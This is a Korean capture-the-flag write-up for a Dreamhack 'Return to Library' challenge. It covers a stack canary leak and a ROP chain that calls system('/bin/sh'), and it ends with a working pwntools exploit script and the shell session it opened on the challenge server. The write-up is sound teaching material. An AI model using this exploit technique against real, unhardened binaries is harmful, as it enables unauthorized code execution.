# Return to Library

## Program
익스플로잇 대상 프로그램은 다음과 같다.

```c
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

#include <stdio.h> 
#include <stdlib.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  system("echo 'system@plt'");

  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

[Return to Library](https://dreamhack.io/wargame/challenges/353)

## Analysis
```bash
EST3524@DESKTOP-411274Q:~/test/RTL$ checksec ./rtl
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/EST3524/.cache/.pwntools-cache-3.10/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[!] An issue occurred while checking PyPI
[*] You have the latest version of Pwntools (4.13.0)
[*] '/home/EST3524/test/RTL/rtl'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

checksec로 rtl에 적용된 보호 기법을 확인 하였다. 실습 환경 및 최신 리눅스 커널에서 ASLR은 기본으로 적용되어 있으므로, 특별히 언급되지 않는다면 ASLR은 적용된 것이다.

```c
const char* binsh = "/bin/sh";
```

위의 코드는 "/bin/sh" 문자열의 시작 주소를 가리키는 char형 포인터 변수 binsh를 정의한다. 그런데, const는 프로그램을 실행하는 동안 변수의 값이 바뀔 수 없도록 만든다. 따라서 binsh변수와 "/bin/sh" 문자열 모두 rodata영역에 위치하며, ASLR 보호 기법의 영향을 받지 않는다.

```c
char buf[0x30];
```

main()에서 선언된 지역 변수는 0x30 크기의 char형 배열 하나뿐이다. 지역 변수의 배치 순서를 확인할 필요는 없지만, Padding이 있을 수 있기 때문에 바이너리를 분석할 때에는 반드시 gdb를 사용하여 직접 필요한 정보를 수집해야 한다.

```asm
────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────
 ► 0x4006f7 <main>       push   rbp
   0x4006f8 <main+1>     mov    rbp, rsp                            RBP => 0x7fffffffe070 ◂— 1
   0x4006fb <main+4>     sub    rsp, 0x40                           RSP => 0x7fffffffe030 (0x7fffffffe070 - 0x40)
   0x4006ff <main+8>     mov    rax, qword ptr fs:[0x28]            RAX, [0x7ffff7d88768] => 0x2b78b0471d085500
   0x400708 <main+17>    mov    qword ptr [rbp - 8], rax            [0x7fffffffe068] <= 0x2b78b0471d085500
   0x40070c <main+21>    xor    eax, eax                            EAX => 0
   0x40070e <main+23>    mov    rax, qword ptr [rip + 0x20095b]     RAX, [stdin@@GLIBC_2.2.5] => 0x7ffff7fa5aa0 (_IO_2_1_stdin_) ◂— 0xfbad2088
   0x400715 <main+30>    mov    ecx, 0                              ECX => 0
   0x40071a <main+35>    mov    edx, 2                              EDX => 2
   0x40071f <main+40>    mov    esi, 0                              ESI => 0
   0x400724 <main+45>    mov    rdi, rax                            RDI => 0x7ffff7fa5aa0 (_IO_2_1_stdin_) ◂— 0xfbad2088
```

실제로, 위의 분석 결과를 보면 buf와 Canary 사이에 8바이트의 Padding이 존재한다.

```c
system("echo 'system@plt'");
```

위의 코드는 system()을 call하여 GOT에 실제 system()의 메모리 주소를 저장하고 두 번째 system() call 부터 system()에 바로 접근할 수 있도록 한다.  

system()을 프로그램에서 처음 call 할 경우 PLT는 GOT에 쓰여진 주소로 jmp 한다. 이 때 GOT에는 실제 system()의 주소가 아닌 동적 링커의 주소가 쓰여져있는데, 동적 링커는 runtime resolve를 수행하여 system()의 실제 주소를 라이브러리에서 찾고 이를 GOT에 기록한다. 따라서 두 번째 실행부터는 PLT가 GOT를 참조할 때, GOT에 system()의 주소가 쓰여져있으므로 runtime resolve를 수행할 필요 없이 바로 system()으로 jmp할 수 있다.

```c
printf("[1] Leak Canary\n");
printf("Buf: ");
read(0, buf, 0x100);
printf("Buf: %s\n", buf);
```

위의 코드는 첫 번째 단계로, Canary 우회를 위해서 존재한다. Canary는 buf와 SFP 사이에 존재하는데, 프로그램 실행 초기에 생성한 Canary 값과 함수가 끝나기 직전에 Canary 값을 비교하는 방법으로 Stack Buffer Overflow가 발생했는지 확인한다.

```c
printf("[2] Overwrite return address\n");
printf("Buf: ");
read(0, buf, 0x100);
```

위의 코드는 두 번째 단계로, 최종적으로 Return to Library 공격 기법을 사용하여 익스플로잇을 수행하도록 하기 위해 존재한다.

## Exploit
익스플로잇에 활용할 수 있는 취약점은 다음과 같다. 

I. /bin/sh 문자열이 rodata 영역에 존재하며, 이는 ASLR 보호 기법의 영향을 받지 않는다.

II. system()의 실제 주소가 이미 GOT에 기록되어 있으며, PLT, GOT는 각각 Code Segment, Data Segment에 위치하기 때문에 ASLR의 영향을 받지 않는다.

III. Exploit Step 1, 2에서 buf의 크기인 0x30 바이트를 넘어서 read 함수가 0x100 바이트만큼 입력받기 때문에 Stack Buffer Overflow를 이용하여 Canary Leak, Return Address Overwrite를 수행할 수 있다.

바이너리의 스택 구조는 다음 표와 같다.

| Stack |
| :---: |
| Low Address |
| buf : 0x30 |
| Padding : 0x8 |
| Canary : 0x8 |
| SFP : 0x8 |
| ret : 0x8 |
| High Address |

익스플로잇은 총 2단계로 구성된다. 

### First Step - Canary Leak
Canary는 8바이트 중 마지막 바이트가 0x00(NULL 문자)로 끝나며, 이는 Little-Endian으로 메모리에 저장된다. 따라서, Canary값은 0x00~(7바이트)의 형태로 저장되어 있는데, 여기서 printf("Buf: %s\n", buf); 는 buf에서부터 NULL 문자를 만날 때까지 값을 출력한다. 따라서, Canary 값 7바이트 중 NULL 바이트가 포함되어 있지 않다면, 0x30(buf) + 0x8(Padding) + 0x1(Canary의 NULL 바이트)에 값을 덮어 쓰고, Canary를 유출시킬 수 있다.

| Stack |
| :---: |
| Low Address |
| buf : 0x414141(AAA)... |
| Padding : 0x414141(AAA)... |
| Canary : 0x41(A)???... |
| SFP |
| ret |
| High Address |

### Second Step - Return Address Overwrite
이 문제에서 Return Address Overwrite는 Return Oriented Programming 공격 기법을 이용해야 한다. Return Oriented Programming은 바이너리가 실행될 때 사용하는 명령은 Code Segment에 위치하므로 ASLR에 의해 주소가 바뀌지 않는데 이 때, pop rdi; ret(pop rdi를 수행한 뒤, ret를 수행한다.)와 같은 Return Gadget을 사용하여 제한적인 환경에서 연쇄적으로 공격을 수행할 수 있는 공격 기법이다. 이는 함수의 Epilogue에서 leave, ret 명령에 의한 rsp의 이동과 밀접한 관련이 있다.  

먼저, leave 명령은 mov rsp rbp / pop rbp(rsp+8, rbp = [rsp-8])로 정의할 수 있는데 mov rsp rbp를 수행했을 때 rsp가 가리키고 있는 위치는 다음과 같다.  

참고로 "<-" 가 가리키고 있는 부분은 각 영역의 시작부분이며 rip는 현재 실행 중인 명령이 아닌, 다음에 실행할 명령을 가리킨다.

| Code Segment |
| :---: |
| leave |
| ret <- rip |
| ... |

| Stack |
| :---: |
| Low Address |
| ... |
| SFP <- rbp = rsp |
| ret |
| ... |
| High Address |

다음으로, pop rbp(rsp+8, rbp = [rsp-8])를 수행했을 때 rsp가 가리키고 있는 위치는 다음 표와 같다.

| Code Segment |
| :---: |
| leave |
| ret <- rip |
| ... |

| Stack |
| :---: |
| Low Address |
| ... |
| ret <- rsp |
| ... |
| High Address |

마지막으로, ret는 pop rip(rsp+8, rip = [rsp-8])로 정의할 수 있는데, 이를 수행했을 때 rsp가 가리키고 있는 위치는 다음과 같다.

| Code Segment |
| :---: |
| leave |
| ret |
| ... <- rip |

| Stack |
| :---: |
| Low Address |
| ... |
| ret |
| ... <- rsp |
| High Address |

여기서 Return Address Overwrite를 통해 스택에 다음과 같은 순서로 값을 밀어넣을 경우 system("/bin/sh")를 실행하도록 만들 수 있다.

| Stack |
| :---: |
| Low Address |
| buf : 0x414141(AAA)... |
| Padding : 0x414141(AAA)... |
| Canary : 0x41(A)???(Canary) |
| SFP : 0x414141(AAA)... |
| ret : 0x???(ret) |
| 0x???(pop rdi; ret) |
| 0x???("/bin/sh") |
| 0x???(system@plt) |
| ... |
| High Address |

Return Address를 ret(ret Gadget)으로 덮어 씌운다. 이 과정은 system()의 내부에서 movaps라는 명령이 실행될 때 rsp가 가리키는 주소가 0x10 단위로 정렬되어있지 않다면 즉, 0x\~0의 형태가 아니라면 오류를 일으키기 때문이다.  참고로 스택이 정렬되어있어야 하는 정확한 시점은 system() 내부에서 movaps 명령이 실행되기 직전이 기준이다. 

실행 대상 함수는 system("/bin/sh")이다. SYSV Calling Convention을 참고할 때, "/bin/sh" 문자열의 주소는 rdi로 전달해야 한다. 따라서 pop rdi; ret을 사용한다. 여기서, "/bin/sh" 문자열을 pop rdi; ret 뒤에 밀어넣는 이유는 ret(ret Gadget)이 pop rip(rsp+8, rip = [rsp-8]) 명령을 실행할 때, rsp가 "/bin/sh" 문자열의 주소를 가리키고 있기 때문이다. leave(rsp = ret Gadget) -> ret(rsp = pop rdi; ret) -> ret(rsp = "/bin/sh") -> pop rdi(rsp = system@plt); ret(rsp = ?) -> system@plt(rsp = ?) 여기서 rsp의 위치는 각 명령을 실행한 다음의 결과이다.

## Exploit Code

```python
from pwn import *

def xlog(value_name, int_value) :
    print("%s : %s" %(value_name, hex(int_value)))

p = remote("host1.dreamhack.games", 19958) # process("./rtl")
e = ELF("./rtl")

buf = b'A'*0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
canary = u64(b'\x00' + p.recvn(7))
xlog("Canary", canary)

ret = 0x0000000000400596
pop_rdi = 0x0000000000400853
binsh = 0x400874
system_plt = e.plt["system"]

payload = b'A'*0x38
payload += p64(canary)
payload += b'A'*0x8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)

p.sendafter(b'Buf: ', payload)

p.interactive()
```

**Result**

```bash
EST3524@DESKTOP-411274Q:~/test/RTL$ python3 test.py
[+] Opening connection to host1.dreamhack.games on port 19958: Done
[*] '/home/EST3524/test/RTL/rtl'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
Canary : 0xe9b25f01eff7aa00
[*] Switching to interactive mode
$ ls
flag
rtl
run.sh
$ cat flag
DH{(REDACTED)}
```

참고 : [Return to Library](https://dreamhack.io/lecture/courses/83)

























